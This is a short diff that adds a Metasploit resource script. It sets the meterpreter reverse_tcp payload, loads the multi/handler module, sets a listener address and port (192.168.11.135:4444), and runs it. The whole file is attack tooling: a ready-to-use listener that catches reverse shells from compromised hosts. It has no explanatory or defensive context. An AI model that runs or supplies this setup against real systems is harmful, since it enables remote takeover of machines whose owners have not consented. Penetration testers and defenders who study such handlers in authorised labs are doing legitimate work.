@@ -1,0 +1,7 @@
+set payload/meterpreter/reverse_tcp
+use multi/handler
+
+set LHOST 192.168.11.135
+set LPORT 4444
+
+exploit
